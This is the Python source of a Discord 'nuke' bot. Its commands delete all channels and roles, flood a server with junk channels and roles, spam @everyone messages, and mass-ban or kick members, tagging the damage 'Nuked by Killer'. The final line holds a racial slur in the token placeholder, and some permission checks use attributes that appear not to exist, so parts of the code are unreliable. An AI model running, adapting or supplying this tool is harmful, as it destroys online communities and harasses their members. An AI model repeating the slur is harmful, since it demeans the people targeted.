import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    print(f'Bot is online as {bot.user.name}')

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Command List",
        description=(
            "**.delchnls** – delete all channels\n"
            "**.delroles** – delete all roles\n"
            "**.cchnls <amount> <name>** – create n text channels\n"
            "**.croles <amount> <name>** – create n roles\n"
            "**.spam <amount> <msg>** – spam every channel n times\n"
            "**.banall** – ban all users\n"
            "**.kickall** – kick all users\n"
            "**.fuck** – full nuke"
        ),
        color=0xde2756
    )
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def delchnls(ctx):
    await ctx.message.delete()
    await asyncio.gather(*[ch.delete() for ch in ctx.guild.channels])

@bot.command()
@commands.has_permissions(administrator=True)
async def delroles(ctx):
    await ctx.message.delete()
    await asyncio.gather(*[r.delete() for r in ctx.guild.roles if r != ctx.guild.default_role])

@bot.command()
@commands.has_permissions(administrator=True)
async def cchnls(ctx, amount: int, *, name: str):
    await ctx.message.delete()
    await asyncio.gather(*[ctx.guild.create_text_channel(f"{name}") for i in range(amount)])

@bot.command()
@commands.has_permissions(administrator=True)
async def croles(ctx, amount: int, *, name: str):
    await ctx.message.delete()
    await asyncio.gather(*[ctx.guild.create_role(name=f"{name}") for i in range(amount)])

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, amount: int, *, message: str):
    await ctx.message.delete()
    tasks = []
    for ch in ctx.guild.text_channels:
        for _ in range(amount):
            tasks.append(ch.send(message))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def banall(ctx):
    await ctx.message.delete()
    g = ctx.guild
    members = [m for m in g.members if m != ctx.author and m != g.owner and not m.bot]
    await asyncio.gather(*[m.ban(reason="Wizzed by Killer") for m in members if m.guild_permissions.bannable], return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def kickall(ctx):
    await ctx.message.delete()
    g = ctx.guild
    members = [m for m in g.members if m != ctx.author and m != g.owner and not m.bot]
    await asyncio.gather(*[m.kick(reason="Killer Runs u") for m in members if m.guild_permissions.kickable], return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def fuck(ctx):
    await ctx.message.delete()
    g = ctx.guild

    await asyncio.gather(*[ch.delete() for ch in g.channels])
    await asyncio.gather(*[r.delete() for r in g.roles if r != g.default_role])

    await asyncio.gather(*[g.create_role(name="Nuked by Killer") for _ in range(30)])
    new_channels = await asyncio.gather(*[g.create_text_channel("Nuked by Killer") for _ in range(30)])

    msgs = []
    for ch in new_channels:
        for _ in range(10):
            msgs.append(ch.send("@everyone # Nuked by Killer"))
    await asyncio.gather(*msgs, return_exceptions=True)

bot.run("ur token nigga")
